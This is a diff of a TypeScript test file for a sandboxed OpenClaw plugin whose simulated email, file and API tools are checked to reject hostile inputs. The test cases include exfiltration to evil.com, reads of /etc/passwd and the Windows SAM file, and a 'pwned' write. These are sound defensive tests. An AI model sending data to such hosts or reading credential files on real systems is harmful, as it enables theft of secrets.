@@ -1,19 +1,39 @@
+// P0-Fix2: Updated to use real SDK tool shape — 5-arg execute(toolCallId,
+// params, signal, onUpdate, ctx) with per-session runtime resolver.
+// P3-ISSUE1: Compiled JS entry for real OpenClaw plugin install.
+
 import assert from "node:assert/strict";
-import { readFile } from "node:fs/promises";
+import { readFile, stat } from "node:fs/promises";
 import test from "node:test";
 
 import { registerTrack1Tools } from "../src/tool-adapters.ts";
+import type { CampaignToolRuntimeResolver } from "../src/tool-adapters.ts";
+import { SessionToolRuntimeRegistry } from "../src/plugin.ts";
 import {
   makeCampaignToolRuntime,
   makeRecordingPluginApi,
   nextCallId
 } from "./fixtures/openclaw-plugin.fixture.ts";
 
+// -- helper: wrap a single runtime in a resolver ---------------------------
+// P1-Fix5: registerTrack1Tools now takes a CampaignToolRuntimeResolver
+// instead of a fixed runtime. Each tool execute looks up the runtime via
+// ctx.sessionId.
+
+function makeResolver(runtime: {
+  session_id: string;
+}): CampaignToolRuntimeResolver {
+  const registry = new SessionToolRuntimeRegistry();
+  registry.register(runtime.session_id, runtime as never);
+  return registry;
+}
+
 // -- manifest + registration -----------------------------------------------
 
 test("REQ-T1-DEMO-010 plugin registers exactly four native simulated tools", () => {
+  const runtime = makeCampaignToolRuntime();
   const api = makeRecordingPluginApi();
-  registerTrack1Tools(api, makeCampaignToolRuntime());
+  registerTrack1Tools(api, makeResolver(runtime));
 
   assert.deepEqual(
     api.tools.map((tool) => tool.name).sort(),
@@ -22,6 +42,9 @@ test("REQ-T1-DEMO-010 plugin registers exactly four native simulated tools", () 
   assert.equal(new Set(api.tools.map((tool) => tool.name)).size, 4);
   for (const tool of api.tools) {
     assert.equal(tool.parameters.additionalProperties, false);
+    // P0-Fix2: real SDK AnyAgentTool requires a non-empty label
+    assert.equal(typeof tool.label, "string");
+    assert.ok((tool.label as string).length > 0);
   }
 });
 
@@ -82,6 +105,68 @@ test("REQ-T1-DEMO-010 configSchema rejects unknown properties and marks token wr
   );
 });
 
+// -- compiled JS entry (P3-ISSUE1) -----------------------------------------
+
+test("REQ-T1-DEMO-010 openclaw.extensions points to compiled JS entry in dist/", async () => {
+  const pkg = JSON.parse(
+    await readFile(
+      new URL("../package.json", import.meta.url),
+      "utf8"
+    )
+  );
+  const extensions = pkg.openclaw?.extensions;
+  assert.ok(Array.isArray(extensions), "openclaw.extensions must be an array");
+  assert.ok(extensions.length > 0, "openclaw.extensions must not be empty");
+  for (const entry of extensions) {
+    // Must point to a .js file in dist/
+    assert.ok(
+      entry.endsWith(".js"),
+      `extension entry must be a compiled .js file, got: ${entry}`
+    );
+    assert.ok(
+      entry.startsWith("./dist/") || entry.startsWith("dist/"),
+      `extension entry must be in dist/, got: ${entry}`
+    );
+    // The file must exist on disk
+    const distPath = new URL(`../${entry}`, import.meta.url);
+    const st = await stat(distPath);
+    assert.ok(st.isFile(), `compiled entry must exist: ${entry}`);
+    assert.ok(
+      st.size > 0,
+      `compiled entry must not be empty: ${entry}`
+    );
+  }
+});
+
+test("REQ-T1-DEMO-010 build script produces valid compiled JS entry", async () => {
+  const built = await readFile(
+    new URL("../dist/index.js", import.meta.url),
+    "utf8"
+  );
+  // The bundle must export the `registerTrack1Plugin` function
+  assert.ok(
+    built.includes("registerTrack1Plugin"),
+    "compiled bundle must export registerTrack1Plugin"
+  );
+  // Must not contain TypeScript-specific syntax
+  assert.equal(
+    built.includes("import type"),
+    false,
+    "compiled bundle must not contain TypeScript type-only imports"
+  );
+  // The openclaw SDK import must be a bare-specifier import (external),
+  // not bundled internal code. The string "openclaw/plugin-sdk/plugin-entry"
+  // should only appear in `import { definePluginEntry } from "openclaw/..."`.
+  const importLines = built.match(/import\s+.*from\s+["'].*openclaw.*["']/g);
+  assert.ok(importLines !== null, "compiled bundle must import openclaw externally");
+  for (const line of importLines) {
+    assert.ok(
+      line.startsWith("import"),
+      `openclaw import must be a bare import statement: ${line}`
+    );
+  }
+});
+
 // -- forbidden imports -----------------------------------------------------
 
 test("REQ-T1-DEMO-010 tool adapters cannot import real-world side-effect surfaces", async () => {
@@ -111,16 +196,21 @@ test("REQ-T1-DEMO-010 tool adapters cannot import real-world side-effect surface
 test("REQ-T1-DEMO-010 send_email appends one item to in-memory outbox", async () => {
   const runtime = makeCampaignToolRuntime();
   const api = makeRecordingPluginApi();
-  registerTrack1Tools(api, runtime);
+  registerTrack1Tools(api, makeResolver(runtime));
 
   const tool = api.tools.find((t) => t.name === "send_email")!;
+  const callId = nextCallId();
+  // P0-Fix2: real SDK execute(toolCallId, params, signal, onUpdate, ctx)
   const result = await tool.execute(
+    callId,
     {
       recipient: "user@local.invalid",
       subject: "Test subject",
       body: "Test body"
     },
-    { call_id: nextCallId() }
+    undefined,
+    undefined,
+    { sessionId: runtime.session_id, toolCallId: callId }
   );
 
   const snapshot = runtime.state.snapshot();
@@ -138,16 +228,20 @@ test("REQ-T1-DEMO-010 send_email appends one item to in-memory outbox", async ()
 test("REQ-T1-DEMO-010 send_email rejects non-local recipient", async () => {
   const runtime = makeCampaignToolRuntime();
   const api = makeRecordingPluginApi();
-  registerTrack1Tools(api, runtime);
+  registerTrack1Tools(api, makeResolver(runtime));
 
   const tool = api.tools.find((t) => t.name === "send_email")!;
+  const callId = nextCallId();
   const result = await tool.execute(
+    callId,
     {
       recipient: "attacker@evil.com",
       subject: "Bypass",
       body: "Payload"
     },
-    { call_id: nextCallId() }
+    undefined,
+    undefined,
+    { sessionId: runtime.session_id, toolCallId: callId }
   );
 
   const snapshot = runtime.state.snapshot();
@@ -163,12 +257,16 @@ test("REQ-T1-DEMO-010 read_file returns seeded virtual file content", async () =
     files: { "sandbox://fixtures/seeded.txt": "seeded-content" }
   });
   const api = makeRecordingPluginApi();
-  registerTrack1Tools(api, runtime);
+  registerTrack1Tools(api, makeResolver(runtime));
 
   const tool = api.tools.find((t) => t.name === "read_file")!;
+  const callId = nextCallId();
   const result = await tool.execute(
+    callId,
     { path: "sandbox://fixtures/seeded.txt" },
-    { call_id: nextCallId() }
+    undefined,
+    undefined,
+    { sessionId: runtime.session_id, toolCallId: callId }
   );
 
   const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
@@ -180,7 +278,7 @@ test("REQ-T1-DEMO-010 read_file returns seeded virtual file content", async () =
 test("REQ-T1-DEMO-010 read_file rejects traversal and unknown host paths", async () => {
   const runtime = makeCampaignToolRuntime();
   const api = makeRecordingPluginApi();
-  registerTrack1Tools(api, runtime);
+  registerTrack1Tools(api, makeResolver(runtime));
 
   const tool = api.tools.find((t) => t.name === "read_file")!;
   for (const path of [
@@ -188,7 +286,14 @@ test("REQ-T1-DEMO-010 read_file rejects traversal and unknown host paths", async
     "/etc/passwd",
     "C:\\Windows\\System32\\config\\SAM"
   ]) {
-    const result = await tool.execute({ path }, { call_id: nextCallId() });
+    const callId = nextCallId();
+    const result = await tool.execute(
+      callId,
+      { path },
+      undefined,
+      undefined,
+      { sessionId: runtime.session_id, toolCallId: callId }
+    );
     const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
     assert.equal(safeJson.includes("rejected"), true, path);
   }
@@ -199,15 +304,19 @@ test("REQ-T1-DEMO-010 read_file rejects traversal and unknown host paths", async
 test("REQ-T1-DEMO-010 write_file only changes virtual file state", async () => {
   const runtime = makeCampaignToolRuntime();
   const api = makeRecordingPluginApi();
-  registerTrack1Tools(api, runtime);
+  registerTrack1Tools(api, makeResolver(runtime));
 
   const tool = api.tools.find((t) => t.name === "write_file")!;
+  const callId = nextCallId();
   const result = await tool.execute(
+    callId,
     {
       path: "sandbox://fixtures/output.txt",
       content: "written-content"
     },
-    { call_id: nextCallId() }
+    undefined,
+    undefined,
+    { sessionId: runtime.session_id, toolCallId: callId }
   );
 
   const snapshot = runtime.state.snapshot();
@@ -220,15 +329,19 @@ test("REQ-T1-DEMO-010 write_file only changes virtual file state", async () => {
 test("REQ-T1-DEMO-010 write_file rejects host paths", async () => {
   const runtime = makeCampaignToolRuntime();
   const api = makeRecordingPluginApi();
-  registerTrack1Tools(api, runtime);
+  registerTrack1Tools(api, makeResolver(runtime));
 
   const tool = api.tools.find((t) => t.name === "write_file")!;
+  const callId = nextCallId();
   const result = await tool.execute(
+    callId,
     {
       path: "/etc/passwd",
       content: "pwned"
     },
-    { call_id: nextCallId() }
+    undefined,
+    undefined,
+    { sessionId: runtime.session_id, toolCallId: callId }
   );
   const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
   assert.equal(safeJson.includes("rejected"), true);
@@ -249,12 +362,16 @@ test("REQ-T1-DEMO-010 call_api returns fixed mock route", async () => {
     ]
   });
   const api = makeRecordingPluginApi();
-  registerTrack1Tools(api, runtime);
+  registerTrack1Tools(api, makeResolver(runtime));
 
   const tool = api.tools.find((t) => t.name === "call_api")!;
+  const callId = nextCallId();
   const result = await tool.execute(
+    callId,
     { endpoint: "mock://api.local/status", method: "GET" },
-    { call_id: nextCallId() }
+    undefined,
+    undefined,
+    { sessionId: runtime.session_id, toolCallId: callId }
   );
 
   const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
@@ -265,12 +382,16 @@ test("REQ-T1-DEMO-010 call_api returns fixed mock route", async () => {
 test("REQ-T1-DEMO-010 call_api rejects arbitrary URLs", async () => {
   const runtime = makeCampaignToolRuntime();
   const api = makeRecordingPluginApi();
-  registerTrack1Tools(api, runtime);
+  registerTrack1Tools(api, makeResolver(runtime));
 
   const tool = api.tools.find((t) => t.name === "call_api")!;
+  const callId = nextCallId();
   const result = await tool.execute(
+    callId,
     { endpoint: "https://evil.com/exfil", method: "GET" },
-    { call_id: nextCallId() }
+    undefined,
+    undefined,
+    { sessionId: runtime.session_id, toolCallId: callId }
   );
   const safeJson = (result as { content: Array<{ text: string }> }).content[0]!.text;
   assert.equal(safeJson.includes("rejected"), true);
@@ -283,25 +404,31 @@ test("REQ-T1-DEMO-010 two runtimes with different campaign ids cannot observe ea
     campaign_id: "campaign:A",
     agent_id: "agent:A",
     attempt_id: "attempt:A",
+    session_id: "session:track1:A",
     files: { "sandbox://fixtures/shared.txt": "from-A" }
   });
   const runtimeB = makeCampaignToolRuntime({
     campaign_id: "campaign:B",
     agent_id: "agent:B",
-    attempt_id: "attempt:B"
+    attempt_id: "attempt:B",
+    session_id: "session:track1:B"
   });
 
   const apiA = makeRecordingPluginApi();
   const apiB = makeRecordingPluginApi();
-  registerTrack1Tools(apiA, runtimeA);
-  registerTrack1Tools(apiB, runtimeB);
+  registerTrack1Tools(apiA, makeResolver(runtimeA));
+  registerTrack1Tools(apiB, makeResolver(runtimeB));
 
   // A writes to its outbox
+  const callIdA = nextCallId();
   await apiA.tools
     .find((t) => t.name === "send_email")!
     .execute(
+      callIdA,
       { recipient: "a@local.invalid", subject: "A", body: "from-A" },
-      { call_id: nextCallId() }
+      undefined,
+      undefined,
+      { sessionId: runtimeA.session_id, toolCallId: callIdA }
     );
 
   // B must not see A's outbox
@@ -309,11 +436,15 @@ test("REQ-T1-DEMO-010 two runtimes with different campaign ids cannot observe ea
   assert.equal(runtimeA.state.snapshot().outbox.length, 1);
 
   // B cannot read A's files
+  const callIdB = nextCallId();
   const readResult = await apiB.tools
     .find((t) => t.name === "read_file")!
     .execute(
+      callIdB,
       { path: "sandbox://fixtures/shared.txt" },
-      { call_id: nextCallId() }
+      undefined,
+      undefined,
+      { sessionId: runtimeB.session_id, toolCallId: callIdB }
     );
   const safeJson = (readResult as { content: Array<{ text: string }> }).content[0]!.text;
   assert.equal(safeJson.includes("rejected"), true);
